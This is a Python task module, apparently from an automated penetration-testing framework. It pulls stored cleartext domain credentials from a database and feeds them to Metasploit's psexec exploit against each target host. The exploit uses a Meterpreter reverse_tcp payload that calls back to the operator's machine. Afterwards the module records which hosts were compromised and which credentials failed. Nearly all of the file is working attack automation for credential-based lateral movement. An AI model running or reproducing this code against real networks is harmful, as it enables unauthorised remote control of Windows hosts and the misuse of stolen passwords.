from msf import exploit
import time

def run(params):
    
    sql = """
        select
            hd.id, hd.ip_address, dc.domain, dc.username, dc.cleartext_password, m.id
        from
            domain_credentials_map m
            join host_data hd on hd.id = m.host_data_id
            join domain_credentials dc on dc.id = m.domain_credentials_id
        where
            m.id = %s and
            hd.successful_info_gather = 0 and dc.valid = 1"""
            
    cursor = params.db.cursor()
    cursor.execute(sql,  params.item_identifier)
    row = cursor.fetchone()
    cursor.close()
    
    if row == None:
        #params.log("Authenticate to {0} using creds {1}\\{2}".format(row[1], row[2], row[3]))
        #params.log("")
        #params.log("This task was skipped to save time, as the task has already been run with a different set of creds")
        params.log("this task has already been successfully handled with a different set of creds")
        return
    
    waitForDifferentTask = False
    cursor2 = params.db.cursor()
    sql2 = """select hd.ip_address 
    from task_list tl join domain_credentials_map m on m.id = tl.item_identifier join host_data hd on hd.id = m.host_data_id 
    where tl.task_descriptions_id = 17 and tl.in_progress = 1 and tl.completed = 0 and tl.footprint_id = %s and hd.ip_address = %s and tl.id != %s"""
    cursor2.execute(sql2, (params.footprint_id,  row[1], params.task_id))
    rows = cursor2.fetchall()
    for r in rows:
        waitForDifferentTask = True
        break
    cursor2.close()
    
    if waitForDifferentTask == True:
        time.sleep(5)
        params.log("another task is currently trying the same thing. will try again later")
        params.setReturnValue("run again")
    else:
        
        if row != None:
            host_data_id = row[0]
            #print "log into host {0} with domain creds {1}\{2}:{3}".format(row[1], row[2], row[3], row[4])
            #params.log("log into host {0} with domain creds {1}\{2}:{3}".format(row[1], row[2], row[3], row[4]))
            cursor.close()
            
            setup = [
                "use exploit/windows/smb/psexec", 
                "set PAYLOAD windows/meterpreter/reverse_tcp", 
                "set RHOST {0}".format(row[1]),
                "set LHOST {0}".format(params.getLocalHost()),
                "set LPORT {0}".format(params.getOpenPort()),
                "set smbdomain {0}".format(row[2]),
                "set smbuser {0}".format(row[3]),
                "set smbpass {0}".format(row[4]),
                "exploit"
            ]
            
            log = ""
            
            result = exploit.runMsf(params, row[0], setup, "psexec")
            for l in result[1]:
                log = log + l + "\r\n"
                params.log(l)
            
            if result[0] == True:
                cursor = params.db.cursor()
                cursor.execute("update host_data set successful_info_gather = 1 where id = %s", (row[0]))
                cursor.close()
            else:
                if result[2] == False:
                    cursor = params.db.cursor()
                    cursor.execute("update domain_credentials_map set psexec_failed = 1 where id = %s", (row[5]))
                    cursor.close()
                
            cursor = params.db.cursor()
            cursor.execute("insert into exploit_logs (host_data_id, vulnerability_description_id, log) values(%s, %s, %s)", (host_data_id, 4, log))
            cursor.close()
